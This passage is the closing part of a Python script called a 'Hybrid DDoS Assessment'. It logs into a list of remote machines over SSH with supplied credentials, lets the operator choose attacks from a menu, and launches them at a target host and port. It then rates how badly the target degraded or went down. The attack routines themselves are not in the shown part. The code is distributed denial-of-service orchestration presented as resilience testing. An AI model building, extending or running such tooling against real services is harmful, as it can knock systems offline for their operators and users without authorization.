            overall = f"CRITICAL VULNERABILITY ⚠ - Service went down in {critical_count} attack(s)"
        elif max_severity >= 4:
            overall = f"HIGH VULNERABILITY 🔴 - Severe degradation in {critical_count} attack(s)"
        elif max_severity >= 3:
            overall = f"MEDIUM VULNERABILITY 🟠 - Moderate impact in {high_count} attack(s)"
        elif max_severity >= 2:
            overall = "LOW VULNERABILITY 🟡 - Minor issues detected"
        else:
            overall = "RESILIENT ✅ - Target handled all attacks successfully"

        print(f"[FINAL VERDICT] {overall}")
        print(f"\n{'='*150}\n")

    def cleanup(self, instances: List[SSHInstance]):
        print("[*] Cleanup...")
        for inst in instances:
            inst.disconnect()
        print("[✓] Done\n")

def parse_args():
    parser = argparse.ArgumentParser(description='Hybrid DDoS Assessment')
    parser.add_argument('-u', '--username', required=True)
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-ips', '--instances', required=True)
    parser.add_argument('-t', '--target', required=True)
    parser.add_argument('-pt', '--port', type=int, default=80)
    parser.add_argument('-d', '--duration', type=int, default=120)
    parser.add_argument('-sp', '--ssh-port', type=int, default=22)
    return parser.parse_args()

def parse_ips(ip_input: str) -> List[str]:
    if os.path.isfile(ip_input):
        with open(ip_input) as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    return [ip.strip() for ip in ip_input.split(',')]

def main():
    args = parse_args()
    print("\n"+"="*150)
    print("HYBRID DDoS ASSESSMENT")
    print("✓ Multiprocessing + Threading (50 threads per process) | ✓ CPU-Adaptive (80-85%) | ✓ 10x-60x multiplier")
    print("="*150)
    logger = CentralizedLoggingManager()
    instances_ips = parse_ips(args.instances)
    if not instances_ips:
        print("[!] No instances")
        return
    ssh_instances = []
    for ip in instances_ips:
        inst_logger = logger._setup_logger(f"Instance_{ip}", f"instance_{ip}.log")
        ssh_instances.append(SSHInstance(ip, args.username, args.password, args.ssh_port, instance_logger=inst_logger))
    selected_attacks = display_attack_menu(AVAILABLE_ATTACKS)
    framework = DDoSAssessmentFramework(ssh_instances, args.target, args.port, logger, selected_attacks, args.duration)
    ready = framework.setup_instances()
    if ready and not GLOBAL_SHUTDOWN:
        try:
            framework.run_assessment(ready)
        except Exception as e:
            if not GLOBAL_SHUTDOWN:
                print(f"[!] Error: {e}")
        finally:
            framework.cleanup(ready)
    print("="*150)
    print(f"[✓] COMPLETE | Logs: {logger.run_dir}")
    print("="*150+"\n")

if __name__ == "__main__":
    main()
